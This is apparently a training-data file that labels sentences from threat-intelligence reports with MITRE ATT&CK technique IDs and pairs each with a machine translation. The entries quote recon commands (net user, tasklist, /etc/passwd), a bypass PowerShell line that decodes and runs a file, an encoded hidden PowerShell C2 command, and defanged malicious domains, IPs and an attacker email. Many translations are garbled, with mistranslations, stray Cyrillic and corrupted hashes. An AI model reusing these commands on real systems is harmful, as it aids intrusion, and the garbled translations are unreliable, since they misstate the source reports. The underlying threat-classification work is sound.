    "This directory will also contain the process id of the running malware in process.id and a “build name” (as it is called by the author) in build.id": [
        {
            "tec_id": "T1057",
            "en_text": "This directory will also contain the process id of the running malware in process.id and a “build name” (as it is called by the author) in build.id",
            "data_text": "This directory will also show the process ID of the malware running on process.id and the \"build name\" (as it is called by the author) on build.id."
        }
    ],
    "It is created as a separate process instead of child process of Office applications": [
        {
            "tec_id": "T1057",
            "en_text": "It is created as a separate process instead of child process of Office applications",
            "data_text": "It is created as a separate process instead of a child process of Office applications"
        }
    ],
    "Enumerates running processes for “Wireshark” and “Sysinternals”": [
        {
            "tec_id": "T1057",
            "en_text": "Enumerates running processes for “Wireshark” and “Sysinternals”",
            "data_text": "List running processes for \"Wireshark\" and \"Sysinternals\""
        }
    ],
    "What does the Poseidon Group do? What happens after a target machine is infected? Once the target’s machine is compromised, the attacker first enumerates all processes running in the system and all services": [
        {
            "tec_id": "T1057",
            "en_text": "What does the Poseidon Group do? What happens after a target machine is infected? Once the target’s machine is compromised, the attacker first enumerates all processes running in the system and all services",
            "data_text": "What does the band Poseidon do? What happens after the target machine is infected? Once the target machine is compromised, the attacker first lists all processes running in the system and all services"
        }
    ],
    "78 runin.bin List of processes names and associated plugins should be run inside these processes": [
        {
            "tec_id": "T1057",
            "en_text": "78 runin.bin List of processes names and associated plugins should be run inside these processes",
            "data_text": "78 runin.bin A list of processes and related plugins must be run within these processes"
        }
    ],
    "The command does not attempt to kill the specific Office process that would load the particular delivery document, such as Excel in the case of this “.xlam” file, but instead attempts to kill processes associated with Word, Excel, PowerPoint and Publisher": [
        {
            "tec_id": "T1057",
            "en_text": "The command does not attempt to kill the specific Office process that would load the particular delivery document, such as Excel in the case of this “.xlam” file, but instead attempts to kill processes associated with Word, Excel, PowerPoint and Publisher",
            "data_text": "The team does not attempt to destroy a specific Office process that will download a specific delivery document, such as Excel in the case of the \".xlam\" file, but instead attempts to destroy processes related to Word, Excel, PowerPoint, and Publisher."
        }
    ],
    "While it includes multiple ways to find Explorer, the preferred method is to get the process id from the current desktop window.": [
        {
            "tec_id": "T1057",
            "en_text": "While it includes multiple ways to find Explorer, the preferred method is to get the process id from the current desktop window.",
            "data_text": "Although it has several ways to find Explorer, the preferred method is to obtain the process ID from the current desktop window."
        }
    ],
    "As part of the anti-debugging or anti-monitoring techniques, ShellTea iterates over all the running processes, applies CRC32 on each process name (after converting the string to capital letters), and then compares the value against a predefined set of CRCs.": [
        {
            "tec_id": "T1057",
            "en_text": "As part of the anti-debugging or anti-monitoring techniques, ShellTea iterates over all the running processes, applies CRC32 on each process name (after converting the string to capital letters), and then compares the value against a predefined set of CRCs.",
            "data_text": "As part of anti-debugging or anti-monitoring methods, ShellTea iterates all running processes, applies CRC32 to each process name (after converting the string to the letter-header), and then compares the value to the specified CRC set."
        }
    ],
    "ps ": [
        {
            "tec_id": "T1057",
            "en_text": "ps ",
            "data_text": "Link to the site"
        }
    ],
    " tasklist ": [
        {
            "tec_id": "T1057",
            "en_text": " tasklist ",
            "data_text": "task list"
        }
    ],
    " lists the running processes": [
        {
            "tec_id": "T1057",
            "en_text": " lists the running processes",
            "data_text": "lists the processes running"
        }
    ],
    "The Trojan will then use the following regular expression to check the HTTP response to the content upload request for the file identifier value: \\”id\\”:(.*) The Trojan will use this file identifier value to monitor for changes made to the file by the actor by checking for changes to the modification time of the <process ID of Trojan>.txt file": [
        {
            "tec_id": "T1070.006",
            "en_text": "The Trojan will then use the following regular expression to check the HTTP response to the content upload request for the file identifier value: \\”id\\”:(.*) The Trojan will use this file identifier value to monitor for changes made to the file by the actor by checking for changes to the modification time of the <process ID of Trojan>.txt file",
            "data_text": "The Trojan will then use the following regular expression to check the HTTP response to the content download request for the file ID value: \\\"id\\\":(.*) Trojan will use this file ID value to monitor changes made by the actor to the file by checking the change time of the <process ID Trojan>.txt file."
        }
    ],
    "After writing to this file, the Trojan will enter a loop to continually to check for changes to the modification time of this file, effectively waiting for the actor to make modifications to the file": [
        {
            "tec_id": "T1070.006",
            "en_text": "After writing to this file, the Trojan will enter a loop to continually to check for changes to the modification time of this file, effectively waiting for the actor to make modifications to the file",
            "data_text": "After writing to this file, the Trojan will enter a loop to constantly check the changes during the file change, actually waiting for the actor to make the changes to the file."
        }
    ],
    "One of the documents we examined with the filename Rocket attacks on Israel.docx (SHA256: 34bdb5b364..) contained inconsistent creation and last modified timestamps, with the last modified timestamp occurring before the creation timestamp": [
        {
            "tec_id": "T1070.006",
            "en_text": "One of the documents we examined with the filename Rocket attacks on Israel.docx (SHA256: 34bdb5b364..) contained inconsistent creation and last modified timestamps, with the last modified timestamp occurring before the creation timestamp",
            "data_text": "One of the documents we studied with the name of rocket attacks on Israel.docx (SHA256: 34bdb5b364).) contained incompatible creation and last modified timestamps, with the last modified timestamp occurring before the timestamp was created."
        }
    ],
    "The Trojan uses the access token to write the string above to the first file uploaded to Google drive whose filename is <process ID of Trojan>.txt": [
        {
            "tec_id": "T1134",
            "en_text": "The Trojan uses the access token to write the string above to the first file uploaded to Google drive whose filename is <process ID of Trojan>.txt",
            "data_text": "Troyan uses an access token to write the line above to the first file uploaded to the Google disk, whose name is <process ID Trojan>.txt"
        }
    ],
    "Create a process by impersonating a logged-on user  Getting a user token using WTSQueryUserToken": [
        {
            "tec_id": "T1134",
            "en_text": "Create a process by impersonating a logged-on user  Getting a user token using WTSQueryUserToken",
            "data_text": "Create a process by impersonating a user who is logged in Obtaining a custom token using WTSQueryUserToken"
        }
    ],
    "The tokens for each platform are hardcoded within the sample:November 2016 to January 2017: \"Evil New Year\" CampaignIn the early part of 2017, Group123 started the \"Evil New Year\" campaign": [
        {
            "tec_id": "T1134",
            "en_text": "The tokens for each platform are hardcoded within the sample:November 2016 to January 2017: \"Evil New Year\" CampaignIn the early part of 2017, Group123 started the \"Evil New Year\" campaign",
            "data_text": "Tokens for each platform are hard-coded as part of the sample: November 2016 - January 2017 - The New Year's Eve campaign In early 2017, Group123 started the Pearl New Year campaign"
        }
    ],
    "Figure 6 Relational diagram of artifacts  We created a timeline of the activity based off the data we collected, and found that the attack dates were tightly clustered into two waves in mid- to late-October and in mid-November as we see in Figure 7 using the timestamps from Table 3": [
        {
            "tec_id": "T1562.001",
            "en_text": "Figure 6 Relational diagram of artifacts  We created a timeline of the activity based off the data we collected, and found that the attack dates were tightly clustered into two waves in mid- to late-October and in mid-November as we see in Figure 7 using the timestamps from Table 3",
            "data_text": "Figure 6 Relational Artefacts Chart We created a timeline based on the data we collected and found that the attack dates were tightly grouped into two waves in mid-to-late October and mid-November as we see in Figure 7 using time values from Table 3"
        }
    ],
    "Ability to disable Microsoft Office Protected View (as shown in Figure 15) by setting the following keys in the Windows Registry: DisableAttachmentsInPV DisableInternetFilesInPV DisableUnsafeLocationsInPV       Figure 15: Disabling Microsoft Office Protected View  Ability to remotely reboot or shut down or clean the system based on the command received from the C2 server, as shown in Figure 16": [
        {
            "tec_id": "T1562.001",
            "en_text": "Ability to disable Microsoft Office Protected View (as shown in Figure 15) by setting the following keys in the Windows Registry: DisableAttachmentsInPV DisableInternetFilesInPV DisableUnsafeLocationsInPV       Figure 15: Disabling Microsoft Office Protected View  Ability to remotely reboot or shut down or clean the system based on the command received from the C2 server, as shown in Figure 16",
            "data_text": "Ability to disable Microsoft Office Protected View (as shown in Figure 15) by installing the following keys in the Windows registry: DisableAttachmentsInPV DisableInternetFilesinPV DisableUnsafeLocationsInRis. 15 PV: Disabling the Microsoft Office Protected View Capacity feature for remote system reboot, shutdown, or cleanup based on a command received from the C2 server, as shown in Figure 16"
        }
    ],
    "From an infrastructure point of view there is no overlap between the two sets of activity, the only overlap is the use of the unique tool “DNSMessenger”  When these points are considered together in conjunction with the significant difference in targeting they make a strong case for classifying this activity as distinct from FIN7 activity": [
        {
            "tec_id": "T1562.001",
            "en_text": "From an infrastructure point of view there is no overlap between the two sets of activity, the only overlap is the use of the unique tool “DNSMessenger”  When these points are considered together in conjunction with the significant difference in targeting they make a strong case for classifying this activity as distinct from FIN7 activity",
            "data_text": "Looking at these points together with a significant difference in the target directions, they are a strong argument for classifying this activity unlike FIN7 activities."
        }
    ],
    "- There were two interesting sub-classes found inside Main Activity: Receiver and Sender": [
        {
            "tec_id": "T1562.001",
            "en_text": "- There were two interesting sub-classes found inside Main Activity: Receiver and Sender",
            "data_text": "- Two interesting subclasses were found as part of the Main Activity: Recipient and Sender"
        }
    ],
    "SHA256 Compiled C2 account POP3S Account SMTPS Accounts   861b6bc1f9.": [
        {
            "tec_id": "T1087",
            "en_text": "SHA256 Compiled C2 account POP3S Account SMTPS Accounts   861b6bc1f9.",
            "data_text": "SHA256 Compiled C2 POP3S Account SMTPs Account 861b6bc1f9."
        }
    ],
    "ARTIFACTS: Documents:     2781526f6b302da00661b9a6a625a5a6ecf4ffccafa61202e9b0e9b61b657867     c357396ca82fdcd6b6f46b748f2b6941051dbc81be5326cf9548e6e95507af7c     ffebcc4d2e851baecd89bf11103e3c9de86f428fdeaf0f8b33d9ea6f5ef56685     Domains:  true-deals[.]com; strikes-withlucky[.]com Email account in registration is: isvarawski@yahoo.com Attacker email account: adrian.1987clark@yahoo.com": [
        {
            "tec_id": "T1087",
            "en_text": "ARTIFACTS: Documents:     2781526f6b302da00661b9a6a625a5a6ecf4ffccafa61202e9b0e9b61b657867     c357396ca82fdcd6b6f46b748f2b6941051dbc81be5326cf9548e6e95507af7c     ffebcc4d2e851baecd89bf11103e3c9de86f428fdeaf0f8b33d9ea6f5ef56685     Domains:  true-deals[.]com; strikes-withlucky[.]com Email account in registration is: isvarawski@yahoo.com Attacker email account: adrian.1987clark@yahoo.com",
            "data_text": "ARTIFICIALS: Documents: 2781526f6b302da00661b9a6a625a5a6ecf4ffcafa61202e9b0e9b61b65786767 c357396ca82fdcd6b6f46b6f648b2b6941051dbc81be5326e78778e787e7e7778e9b6e9b6e9b6e9b61b68b6578b68b68c68c68c68c6e7b6c6e7b6e7b61987clark@yahoo.com"
        }
    ],
    "Restricting these privileges may prevent malware from running or limit its capability to spread through the network.Carefully consider the risks before granting administrative rights to users on their own machines.Scrub and verify all administrator accounts regularly.Configure Group Policy to restrict all users to only one login session, where possible.Enforce secure network authentication, where possible.Instruct administrators to use non-privileged accounts for standard functions such as web browsing or checking webmail.Segment networks into logical enclaves and restrict host-to-host communication paths": [
        {
            "tec_id": "T1087",
            "en_text": "Restricting these privileges may prevent malware from running or limit its capability to spread through the network.Carefully consider the risks before granting administrative rights to users on their own machines.Scrub and verify all administrator accounts regularly.Configure Group Policy to restrict all users to only one login session, where possible.Enforce secure network authentication, where possible.Instruct administrators to use non-privileged accounts for standard functions such as web browsing or checking webmail.Segment networks into logical enclaves and restrict host-to-host communication paths",
            "data_text": "Limiting these privileges can prevent malware from running or limit its ability to propagate over the network.Carefully consider the risks before granting administrative rights to users on their machines.Hide and check all administrator accounts regularly.Configure a group policy to limit all users to only one login session where possible.Apply secure network authentication wherever possible.Instruct administrators to use unprivileged accounts for standard features, such as browsing the Web or checking Web mail.Segment networks into logical enclosures and limit the communication path between the host and the host"
        }
    ],
    "This may include information about the currently logged in user, the hostname, network configuration data, active connections, process information, local and domain administrator accounts, an enumeration of user directories, and other data": [
        {
            "tec_id": "T1087",
            "en_text": "This may include information about the currently logged in user, the hostname, network configuration data, active connections, process information, local and domain administrator accounts, an enumeration of user directories, and other data",
            "data_text": "This can include current user information, hostname, network configuration data, active connections, process information, local and domain administrator accounts, a list of user directories, and other data."
        }
    ],
    "AutoFocus customers may learn more from the DarkHydrus tag  IOC Related SHA256 Hashes Payloads cec36e8ed65ac6f250c05b4a17c09f58bb80c19b73169aaf40fa15c8d3a9a6a1 ac7f9c536153780ccbec949f23b86f3d16e3105a5f14bb667df752aa815b0dc4 a547a02eb4fcb8f446da9b50838503de0d46f9bb2fd197c9ff63021243ea6d88 d428d79f58425d831c2ee0a73f04749715e8c4dd30ccd81d92fe17485e6dfcda dd2625388bb2d2b02b6c10d4ee78f68a918b25ddd712a0862bcf92fa64284ffa b2571e3b4afbce56da8faa726b726eb465f2e5e5ed74cf3b172b5dd80460ad81 c8b3d4b6acce6b6655e17255ef7a214651b7fc4e43f9964df24556343393a1a3 ce84b3c7986e6a48ca3171e703e7083e769e9ced1bbdd7edf8f3eab7ce20fd00 99541ab28fc3328e25723607df4b0d9ea0a1af31b58e2da07eff9f15c4e6565c Delivery documents d393349a4ad00902e3d415b622cf27987a0170a786ca3a1f991a521bff645318 8063c3f134f4413b793dfc05f035b6480aa1636996e8ac4b94646292a5f87fde 9eac37a5c675cd1750cd50b01fc05085ce0092a19ba97026292a60b11b45bf49 cf9b2b40ac621aaf3241ff570bd7a238f6402102c29e4fbba3c5ce0cb8bc25f9 0a3d5b2a8ed60e0d96d5f0d9d6e00cd6ab882863afbb951f10c395a3d991fbc1 0b1d5e17443f0896c959d22fa15dadcae5ab083a35b3ff6cb48c7f967649ec82 870c8b29be2b596cc2e33045ec48c80251e668abd736cef9c5449df16cf2d3b8 ff0b59f23630f4a854448b82f1f0cd66bc4b1124a3f49f0aecaca28309673cb0 01fd7992aa71f4dca3a3766c438fbabe9aea78ca5812ab75b5371b48bd2625e2 6dcb3492a45a08127f9816a1b9e195de2bb7e0731c4e7168392d0e8068adae7a 47b8ad55b66cdcd78d972d6df5338b2e32c91af0a666531baf1621d2786e7870 776c056096f0e73898723c0807269bc299ae3bbd8e9542f0a1cbba0fd3470cb4 cf7863e023475d695c6f72c471d314b8b1781c6e9087ff4d70118b30205da5f0 e88045931b9d99511ce71cc94f2e3d1159581e5eb26d4e05146749e1620dc678 26e641a9149ff86759c317b57229f59ac48c5968846813cafb3c4e87c774e245 b5cfaac25d87a6e8ebabc918facce491788863f120371c9d00009d78b6a8c350 ad3fd1571277c7ce93dfbd58cee3b3bec84eeaf6bb29a279ecb6a656028f771c Related Domains maccaffe[.]com cisc0[.]net 0utl00k[.]net msdncss[.]com 0ffice[.]com 0ffiice[.]com micrrosoft[.]net anyconnect[.]stream bigip[.]stream  fortiweb[.]download  kaspersky[.]science  microtik[.]stream  owa365[.]bid  symanteclive[.]download  windowsdefender[.]win allexa[.]net kaspersky[.]host hotmai1[.]com 0utlook[.]bid": [],
    "Message 2:    Headers Received: by mailcenter.support   Sender Council on Foreign Relations <webprint@fprii.net>   Subject The Four Traps China May Fall Into   Body Content and images included within the e-mail body were a direct copy of the following CFR article: https://www.cfr.org/blog/four-traps-china-may-fall   Notes Multiple hyperlinks within the e-mail body lead to a malicious RTF document located at the URL  hxxp://fprii.net/The_Four_Traps_for_China.doc": [
        {
            "tec_id": "T1087",
            "en_text": "Message 2:    Headers Received: by mailcenter.support   Sender Council on Foreign Relations <webprint@fprii.net>   Subject The Four Traps China May Fall Into   Body Content and images included within the e-mail body were a direct copy of the following CFR article: https://www.cfr.org/blog/four-traps-china-may-fall   Notes Multiple hyperlinks within the e-mail body lead to a malicious RTF document located at the URL  hxxp://fprii.net/The_Four_Traps_for_China.doc",
            "data_text": "Message 2: Headers received: by mail center.support Сендерского Council on Foreign Relations <webprint@fprii.net> The Four traps China can get in the body and image, included in the e-mail have been a straight copy of the next article CFR : https://www.cfr.org/blog/four-traps-china-may-fall is a Multiple parties inside the body an email to sugar beet RTF document, which is located on the URL. hxxp://fprii.net/The_Four_Traps_for_China.doc"
        }
    ],
    "IOCs Domain supservermgr[.]com URL hxxp://supservermgr[.]com/sys/upd/pageupd.php Zebrocy d697160aecf152a81a89a6b5a7d9e1b8b5e121724038c676157ac72f20364edc cba5ab65a24be52214736bc1a5bc984953a9c15d0a3826d5b15e94036e5497df 25f0d1cbcc53d8cfd6d848e12895ce376fbbfaf279be591774b28f70852a4fd8 115fd8c619fa173622c7a1e84efdf6fed08a25d3ca3095404dcbd5ac3deb1f03 f27836430742c9e014e1b080d89c47e43db299c2e00d0c0801a2830b41b57bc1 5b5e80f63c04402d0b282e95e32155b2f86cf604a6837853ab467111d4ac15e2 dd7e69e14c88972ac173132b90b3f4bfb2d1faec15cca256a256dd3a12b6e75d Koadic abbad7acd50754f096fdc6551e728aa6054dcf8e55946f90a02b17db552471ca User Agents Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; InfoPath.1) Mozilla/5.0 (Windows NT 6.1; WOW64) WinHttp/1.6.3.8 (WinHTTP/5.1) like Gecko Mozilla v5.1 (Windows NT 6.1; rv:6.0.1) Gecko/20100101 Firefox/6.0.1 IPs 185.25.51[.]198 185.25.50[.]93 220.158.216[.]127 92.114.92[.]102 86.106.131[.]177  DDE Docs 85da72c7dbf5da543e10f3f806afd4ebf133f27b6af7859aded2c3a6eced2fd5 8cf3bc2bf36342e844e9c8108393562538a9af2a1011c80bb46416c0572c86ff": [],
    "Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network": [
        {
            "tec_id": "T1087",
            "en_text": "Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network",
            "data_text": "Umbrella, our secure Internet gateway (SIG), blocks users from connecting to a malicious domain, IP addresses, and URLs, whether users are on or off the corporate network."
        }
    ],
    "It appears the same actor developed both the Komplex and XAgentOSX tools, based on similarities within the following project paths found within the tools: Komplex: /Users/kazak/Desktop/Project/komplex XAgent OSX: /Users/kazak/Desktop/Project/XAgentOSX We believe it is possible that Sofacy uses Komplex to download and install the XAgentOSX tool to use its expanded command set on the compromised system": [
        {
            "tec_id": "T1087",
            "en_text": "It appears the same actor developed both the Komplex and XAgentOSX tools, based on similarities within the following project paths found within the tools: Komplex: /Users/kazak/Desktop/Project/komplex XAgent OSX: /Users/kazak/Desktop/Project/XAgentOSX We believe it is possible that Sofacy uses Komplex to download and install the XAgentOSX tool to use its expanded command set on the compromised system",
            "data_text": "Looks like the same actor and Komplex, and XAgentИнструменты OSX, based on сходствах under the following ways of the project, found in the toolbox : Komplex : / Users/kazak/Desktop/Project/Komplex XAgent OSX : / Users/kazak/Desktop/Project/XAgentМы consider that there may be that Sofacy uses Komplex to download and install XAgentИнструмент OSX for the use of an expanded set of commands on to.ompromised system"
        }
    ],
    "With these outputs, FIN6 was able to identify user accounts that could access additional hosts in the domain": [
        {
            "tec_id": "T1087",
            "en_text": "With these outputs, FIN6 was able to identify user accounts that could access additional hosts in the domain",
            "data_text": "With these outputs, FIN6 was able to identify user accounts that could access additional hosts in the domain"
        }
    ],
    "The PowerShell script collects all possible information on the user and the network, including snapshots, computer and user names, emails from registry, tasks in task scheduler, system information, AVs registered in the system, privileges, domain and workgroup information": [
        {
            "tec_id": "T1087",
            "en_text": "The PowerShell script collects all possible information on the user and the network, including snapshots, computer and user names, emails from registry, tasks in task scheduler, system information, AVs registered in the system, privileges, domain and workgroup information",
            "data_text": "The PowerShell script collects all possible user and network information, including snapshots, computer and user names, registry emails, tasks in the task scheduler, system information, AV devices, permissions, domain, and workgroup information"
        }
    ],
    "The shareDll32 module then enumerates and identifies systems connected on the same domain using WNetEnumResource and GetComputerNameW": [
        {
            "tec_id": "T1087",
            "en_text": "The shareDll32 module then enumerates and identifies systems connected on the same domain using WNetEnumResource and GetComputerNameW",
            "data_text": "The shareDll32 module lists and identifies systems connected on the same domain using WNetEnumResource and GetComputerNameV"
        }
    ],
    "net user ": [
        {
            "tec_id": "T1087",
            "en_text": "net user ",
            "data_text": "network user"
        }
    ],
    " net group ": [
        {
            "tec_id": "T1087",
            "en_text": " net group ",
            "data_text": "a clean group"
        }
    ],
    " net localgroup ": [
        {
            "tec_id": "T1087",
            "en_text": " net localgroup ",
            "data_text": "clean local group"
        }
    ],
    " /etc/passwd ": [
        {
            "tec_id": "T1087",
            "en_text": " /etc/passwd ",
            "data_text": "/etc/passwd"
        }
    ],
    " Get-MsolRoleMember": [
        {
            "tec_id": "T1087",
            "en_text": " Get-MsolRoleMember",
            "data_text": "Get-MolRoleMember"
        }
    ],
    "Its use of a PowerShell payload means that only legitimate system processes are utilized and that the malicious code execution can only be identified through enhanced logging or in memory": [
        {
            "tec_id": "T1546.013",
            "en_text": "Its use of a PowerShell payload means that only legitimate system processes are utilized and that the malicious code execution can only be identified through enhanced logging or in memory",
            "data_text": "Using PowerShell means that only legitimate system processes are used and that execution of malicious code can only be identified through an extended log entry or in memory"
        }
    ],
    "Mandiant initially identified an early variant of the POSHSPY backdoor deployed as PowerShell scripts during an incident response engagement in 2015": [
        {
            "tec_id": "T1546.013",
            "en_text": "Mandiant initially identified an early variant of the POSHSPY backdoor deployed as PowerShell scripts during an incident response engagement in 2015",
            "data_text": "Mandant initially identified an early version of the POSHSPY backdoor deployed as PowerShell scripts during incident response in 2015."
        }
    ],
    "Figure 2: WindowsParentalControlsMigration CommandLineTemplate Figure 3 contains the decoded PowerShell command from the “CommandLineTemplate.”      Figure 3: Decoded CommandLineTemplate PowerShell code POSHSPY PowerShell Component The full code for a POSHSPY sample is available here": [
        {
            "tec_id": "T1546.013",
            "en_text": "Figure 2: WindowsParentalControlsMigration CommandLineTemplate Figure 3 contains the decoded PowerShell command from the “CommandLineTemplate.”      Figure 3: Decoded CommandLineTemplate PowerShell code POSHSPY PowerShell Component The full code for a POSHSPY sample is available here",
            "data_text": "Figure 2: WindowsParentalControlsMigration CommandLineTemplateIn Figure. 3 contains a PowerShell decoded command from \"CommandLineTemplate\". Figure 3: Decoded Command Line CodeThe PowerShell Planet component of the PowerShell Full POSHSPY Sample Code is available here"
        }
    ],
    "Additional Reading This PowerShell logging blog post contains more information on improving PowerShell visibility in your environment": [
        {
            "tec_id": "T1546.013",
            "en_text": "Additional Reading This PowerShell logging blog post contains more information on improving PowerShell visibility in your environment",
            "data_text": "Additional Reading This PowerShell log post contains more information about improving the visibility of PowerShell in your environment"
        }
    ],
    "However, in this new variant, all the DNS activity is initiated and executed solely from memory – unlike previous attacks which used PowerShell commands": [
        {
            "tec_id": "T1546.013",
            "en_text": "However, in this new variant, all the DNS activity is initiated and executed solely from memory – unlike previous attacks which used PowerShell commands",
            "data_text": "In this new version, however, all DNS activity is initiated and executed solely from memory – unlike previous attacks that used PowerShell commands."
        }
    ],
    "The PowerShell script executes a compressed first stage PowerShell child process, which then performs a second stage PowerShell process": [
        {
            "tec_id": "T1546.013",
            "en_text": "The PowerShell script executes a compressed first stage PowerShell child process, which then performs a second stage PowerShell process",
            "data_text": "The PowerShell script performs the compressed first stage of the PowerShell child process, which then performs the second stage of the PowerShell process"
        }
    ],
    "The PowerShell implant used in the Olympics campaign was a stager based on the PowerShell Empire framework that created an encrypted channel to the attacker’s server": [
        {
            "tec_id": "T1546.013",
            "en_text": "The PowerShell implant used in the Olympics campaign was a stager based on the PowerShell Empire framework that created an encrypted channel to the attacker’s server",
            "data_text": "The PowerShell implant used in the Olympics campaign was a stager based on the PowerShell Empire framework that created an encrypted channel to the attacker's server."
        }
    ],
    "(For more on steganography, see the McAfee Labs Threats Report, June 2017, page 33.) The implants covered in this research establish a permanent presence on the victim’s system once the PowerShell implant is executed": [
        {
            "tec_id": "T1546.013",
            "en_text": "(For more on steganography, see the McAfee Labs Threats Report, June 2017, page 33.) The implants covered in this research establish a permanent presence on the victim’s system once the PowerShell implant is executed",
            "data_text": "(For more information on steganography, see . McAfee Labs Threat Report, June 2017, p. 33.) Implants covered by this study establish a permanent presence on the victim's system after performing a PowerShell implant."
        }
    ],
    "The main function performed by the SCT file is to Base64 decode the contents of WindowsDefender.ini file and execute the decoded PowerShell Script using the following command line: powershell.exe -exec Bypass -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\\\ProgramData\\\\WindowsDefender.ini) The rest of the malicious activities are performed by the PowerShell Script": [],
    "PowerShell File Analysis The PowerShell script employs several layers of obfuscation to hide its actual functionality": [
        {
            "tec_id": "T1546.013",
            "en_text": "PowerShell File Analysis The PowerShell script employs several layers of obfuscation to hide its actual functionality",
            "data_text": "PowerShell File Analysis PowerShell Script uses multiple layers of obfuscation to hide its real functionality"
        }
    ],
    "Figure 11: PowerShell script is XOR encoded using a single byte key After deobfuscating the contents of the PowerShell Script, we can divide it into three sections": [
        {
            "tec_id": "T1546.013",
            "en_text": "Figure 11: PowerShell script is XOR encoded using a single byte key After deobfuscating the contents of the PowerShell Script, we can divide it into three sections",
            "data_text": "Figure 11: PowerShell script is XOR encoded using a single byte after deobfusing the contents of the PowerShell script, we can split it into three sections"
        }
    ],
    "Section 1 The first section of the PowerShell script is responsible for setting different key variables that are used by the remaining sections of the PowerShell script, especially the following variables:  TEMpPAtH = \"C:\\ProgramData\\\" (the path used for storing the temp files) Get_vAlIdIP = https://api.ipify.org/ (used to get the public IP address of the machine) FIlENAmePATHP = WindowsDefender.ini (file used to store Powershell code) PRIVAtE = Private Key exponents PUbLIc = Public Key exponents Hklm = \"HKLM:\\Software\\\" Hkcu = \"HKCU:\\Software\\\" ValuE = \"kaspersky\" SYSID DrAGon_MidDLe = [array of proxy URLs]  Among those variables, there is one variable of particular interest, DrAGon_MidDLe, which stores the list of proxy URLs (detailed at the end of the blog in the Network Indicators portion of the Indicators of Compromise section) that will be used to interact with the C2 server, as shown in Figure 12": [
        {
            "tec_id": "T1546.013",
            "en_text": "Section 1 The first section of the PowerShell script is responsible for setting different key variables that are used by the remaining sections of the PowerShell script, especially the following variables:  TEMpPAtH = \"C:\\ProgramData\\\" (the path used for storing the temp files) Get_vAlIdIP = https://api.ipify.org/ (used to get the public IP address of the machine) FIlENAmePATHP = WindowsDefender.ini (file used to store Powershell code) PRIVAtE = Private Key exponents PUbLIc = Public Key exponents Hklm = \"HKLM:\\Software\\\" Hkcu = \"HKCU:\\Software\\\" ValuE = \"kaspersky\" SYSID DrAGon_MidDLe = [array of proxy URLs]  Among those variables, there is one variable of particular interest, DrAGon_MidDLe, which stores the list of proxy URLs (detailed at the end of the blog in the Network Indicators portion of the Indicators of Compromise section) that will be used to interact with the C2 server, as shown in Figure 12",
            "data_text": "..."
        }
    ],
    "The malicious macros were all designed to use Windows PowerShell to download a shellcode-based payload from a remote server": [
        {
            "tec_id": "T1546.013",
            "en_text": "The malicious macros were all designed to use Windows PowerShell to download a shellcode-based payload from a remote server",
            "data_text": "The attackers were created to use Windows PowerShell to download a shellcode-based file from a remote server"
        }
    ],
    "The macro uses PowerShell to download a shellcode-based payload from a remote server using one of two available techniques": [
        {
            "tec_id": "T1546.013",
            "en_text": "The macro uses PowerShell to download a shellcode-based payload from a remote server using one of two available techniques",
            "data_text": "Macros uses PowerShell to load a code-based shell from a remote server using one of two available methods"
        }
    ],
    "On January 1, 2017, we observed this URL responding to the above HTTP request with the following data:powershell.exe -exec bypass -window hidden -noni -nop -encoded JABjAG8AbQBtAGEAbgBkACAAPQAgACcAVwB3AEIATwBBAEcAVQBBAGQAQQBBAHUAQQBGAE0AQQBaAFEAQgB5AEEASABZAEEAYQBRAEIAagBBAEcAVQBBAFUAQQBCAHYAQQBHAGsAQQBiAGcAQgAwAEEARQAwAEEAWQBRAEIAdQBBAEcARQBBAFoAdwBCAGwAQQBIAEkAQQBYAFEAQQA2AEEARABvAEEAVQB3AEIAbABBAEgASQBBAGQAZwBCAGwAQQBIAEkAQQBRAHcAQgBsAEEASABJAEEAZABBAEIAcABBAEcAWQBBAGEAUQBCAGoAQQBHAEUAQQBkAEEAQgBsAEEARgBZAEEAWQBRAEIAcwBBAEcAawBBAFoAQQBCAGgAQQBIAF..snip..As you can see, the C2 server responds with a PowerShell command that will run on the system": [
        {
            "tec_id": "T1546.013",
            "en_text": "On January 1, 2017, we observed this URL responding to the above HTTP request with the following data:powershell.exe -exec bypass -window hidden -noni -nop -encoded JABjAG8AbQBtAGEAbgBkACAAPQAgACcAVwB3AEIATwBBAEcAVQBBAGQAQQBBAHUAQQBGAE0AQQBaAFEAQgB5AEEASABZAEEAYQBRAEIAagBBAEcAVQBBAFUAQQBCAHYAQQBHAGsAQQBiAGcAQgAwAEEARQAwAEEAWQBRAEIAdQBBAEcARQBBAFoAdwBCAGwAQQBIAEkAQQBYAFEAQQA2AEEARABvAEEAVQB3AEIAbABBAEgASQBBAGQAZwBCAGwAQQBIAEkAQQBRAHcAQgBsAEEASABJAEEAZABBAEIAcABBAEcAWQBBAGEAUQBCAGoAQQBHAEUAQQBkAEEAQgBsAEEARgBZAEEAWQBRAEIAcwBBAEcAawBBAFoAQQBCAGgAQQBIAF..snip..As you can see, the C2 server responds with a PowerShell command that will run on the system",
            "data_text": "1 January 2017 we have seen that this URL to the above HTTP requests to данными:powershell.exe - exec bypass, is - noni - nop - encoded JABjAG8AbQBtАГЭбгБкАКААПКАГАККАВВБ3AEIATwBBАЭКАВКВБAGQAQQBBАХУАQQBGAE0AQQBaАФЕАКгБ5АЕАСАБЗAEEAYQBRAEIAagBBАЭКАВКВБAFUAQQBCAHYAQQBHAGSAQQBiagcAQgAwAEEARQAWAEEAWQBRAEIAdQBB АЭКАРКББАфоАдвкэAGwAQQBIAEkAQQBYAFEAQQA2AEEARABVAEAVQB3АЕИАбАББАЕГАСКВБАГ.KAZvBKAGWAQQBIAECAQQBRAHcAQgBSAEASABAEIAcABBAEcAWQBBAGEAUQBCAGOAQQBHAEUAQQBkaEEAQgBSAEEAWQBRAEIAcwBAABBAEIAcABBAEACABBAEACABBAEACABBAEQBAGOAQQBAGOAQQBAGOAECAQQBEAEAQQBSAEAEAEAEAEQQBAEAEAEAEQBSAEQBAECAECAECAQQBSAEQQBSAEQBAAs you can see, the C2 server responds with a PowerShell command that will run on the system"
        }
    ],
